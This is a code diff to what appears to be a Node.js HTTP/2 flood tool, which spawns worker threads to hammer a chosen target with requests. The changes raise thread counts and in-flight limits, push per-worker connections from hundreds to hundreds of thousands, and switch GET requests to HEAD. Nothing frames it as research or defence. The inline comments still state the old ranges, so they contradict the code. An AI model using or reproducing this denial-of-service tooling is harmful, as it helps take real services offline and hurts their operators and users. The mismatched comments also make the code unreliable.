@@ -3,9 +3,9 @@ const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
 const net = require('net');
 
-const THREADS = 99;
-const POWER_MULTIPLIER = 2;
-const MAX_INFLIGHT = 2000;
+const THREADS = 100;
+const POWER_MULTIPLIER = 1;
+const MAX_INFLIGHT = 4000;
 const LIVE_REFRESH_RATE = 100;
 
 let totalRequests = 0;
@@ -37,12 +37,12 @@ if (isMainThread) {
 
     // Start the workers with dynamic connection numbers
     for (let i = 0; i < THREADS; i++) {
-        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
+        const initialConnections = getRandomInRange(20000, 500000);  // Random initial connections between 200 and 500
         new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
     }
 
     for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
+        const additionalConnections = getRandomInRange(15004, 50000);  // Random additional connections between 154 and 500
         new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
     }
 
@@ -96,7 +96,7 @@ if (isMainThread) {
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const req = client.request({ ':method': 'GET', ':path': '/' });
+                const req = client.request({ ':method': 'HEAD', ':path': '/' });
 
                 req.on('response', () => {
                     inflight.count--;
